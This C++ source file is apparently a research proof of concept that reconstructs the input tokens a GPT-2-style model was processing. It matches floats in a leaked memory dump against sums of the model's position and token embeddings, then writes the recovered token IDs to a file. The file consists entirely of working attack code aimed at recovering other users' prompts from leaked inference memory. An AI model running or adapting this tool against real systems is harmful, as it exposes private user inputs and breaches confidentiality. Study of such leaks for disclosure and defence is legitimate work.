#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>
#include <map>
#include <vector>
#include <utility>
#include <algorithm>

#define MAX_POS 32

float* load_float_array_from_file(const char* filename, size_t* size) {
    FILE* file = fopen(filename, "rb");
    if (file == NULL) {
        perror("Error opening file");
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    *size = file_size;

    size_t num_elements = file_size / sizeof(float);
    float* array = (float*)malloc(num_elements * sizeof(float));

    if (array == NULL) {
        fclose(file);
        perror("Memory allocation failed");
        return NULL;
    }

    fread(array, sizeof(float), num_elements, file);

    fclose(file);

    return array;
}


float wpe[1024][768];
float wte[50257][768];

int main(int argc, char** argv) {
    if (argc != 2) {
        printf("Leaked data file required as argument\n");
        return -1;
    }

    printf("Loading data..\n");

    size_t leaked_data_size = 0;
    float* leaked_data = load_float_array_from_file(argv[1], &leaked_data_size);

    // Read in the embedding weights
    size_t wpe_tmp_size;
    float* wpe_tmp = load_float_array_from_file("wpe.bin", &wpe_tmp_size);
    size_t wte_tmp_size;
    float* wte_tmp = load_float_array_from_file("wte.bin", &wte_tmp_size);

    memcpy(&wpe[0], wpe_tmp, 1024 * 768 * sizeof(float));
    memcpy(&wte[0], wte_tmp, 50257 * 768 * sizeof(float));



    uint64_t min = 0x2f800000;
    uint64_t max = 0xc09c37f5;

    size_t lut_size = (max - min + 1) * 8;

    printf("max: 0x%lx\n", max);
    printf("min: 0x%lx\n", min);
    printf("LUT size: 0x%lx\n", lut_size);

    // Build the lookup table
    std::vector<std::pair<uint16_t, uint16_t>>** lut = (std::vector<std::pair<uint16_t, uint16_t>>**) mmap(NULL, lut_size, PROT_READ |  PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    memset(lut, 0, lut_size);

    if (lut == MAP_FAILED) {
        printf("Failed to allocate lut\n");
        return -1;
    }

    //while(1) { }

    printf("Building LUT..\n");
    for (unsigned int pos = 0; pos < MAX_POS; pos++) {
        printf("pos: %d\n", pos);

        for (unsigned int emb = 0; emb < 50257; emb++) {
            float h[768];

            for (unsigned int i = 0; i < 768; i++) {
                h[i] = wpe[pos][i] + wte[emb][i];
            }

            for (unsigned int i = 0; i < 768; i++) {
                uint32_t value = *(uint32_t*)&h[i];


                //if (value > max) max = value;
                //if (value < min && value != 0x0) min = value;

                if (value >= min && value <= max) {
                    //printf("v: 0x%x\n", value);
                    //printf("min: 0x%x\n", min);

                    if (lut[value - min] == nullptr) {
                        lut[value - min] = new std::vector<std::pair<uint16_t, uint16_t>>({ { pos, emb } });
                    } else {
                        if (std::find(lut[value - min]->begin(), lut[value - min]->end(), std::make_pair<uint16_t, uint16_t>(pos, emb)) == lut[value - min]->end())
                        lut[value - min]->push_back( { pos, emb } );
                    }
                }
            }
        }

        //printf("max: 0x%x\n", max);
        //printf("min: 0x%x\n", min);
        //return 0;
        
        //printf("seen double: 0x%x\n", double_ctr);
        //printf("total: 0x%x\n", 31 * 50257 * 768);
        //printf("percentage: %d\n", 100.0f * (double_ctr / (31.0 * 50257.0 * 768.0)));
        //return 0;


        // For every value in the leaked data, look up if the value is contained
        // in the LUT
        printf("Looking up leaked data..\n");

        for (unsigned i = 0; i < (unsigned int)(leaked_data_size / 4) - 768; i += 768) {
            
            // We count the occurrences of values for all elements of the possible h
            std::map<std::pair<uint16_t, unsigned int>, std::vector<uint32_t>> h_elements_map;
            
            for (unsigned int j = 0; j < 768; j++) {
                uint32_t value = *(uint32_t*)&leaked_data[i + j];

                if (value >= min && value <= max) {
                    if (lut[value - min] != nullptr) {
                        //if (lut[value - min]->size() != 1) {
                        //    printf("lut[value - min]->size() : %ld\n", lut[value - min]->size());
                        //}

                        for (auto v : *lut[value - min]) {
                            auto pos = v.first;
                            auto emb = v.second;

                            if (std::find(h_elements_map[{pos, emb}].begin(), h_elements_map[{pos, emb}].end(), value) == h_elements_map[{pos, emb}].end())
                                h_elements_map[{pos, emb}].push_back(value);

                            //if (pos == 15 && emb == 464) {
                            //    printf("ua: 0x%x\n", value);
                            //}
                        }
                    }
                }
            }

            //printf("h_elements_map.size(): %ld\n", h_elements_map.size());
            //return 0;
            if (h_elements_map.size() < 16) continue;

            // Iterate over the map and look which h has at least 16 matching occurrences
            for (auto h_ : h_elements_map) {
                auto h = h_.first;
                auto ctr = h_.second;

                auto pos = h.first;
                auto emb = h.second;

                if (ctr.size() >= 16) {
                    printf("pos: %d, emb: %d | size: %d\n", pos, emb, ctr.size());

                    FILE *f = fopen("reconstructed_leaked.bin", "a+");
                    fwrite(&emb, 4, 1, f);
                    fclose(f);

                    goto done;
                }

                //if (pos == 15 && emb == 464) {
                //    printf("Found\n");
                //    printf("pos: %d, emb: %d | ctr: %d\n", pos, emb, ctr);
                //}
            }
        }

        printf("Done.\n");

done:
        // Deallocate the LUT entries
        for (unsigned int i = 0; i < (unsigned int)(lut_size / 8); i++) {
            if (lut[i] != nullptr) {
                delete lut[i];
                lut[i] = nullptr;
            }
        }
    }

    return 0;
}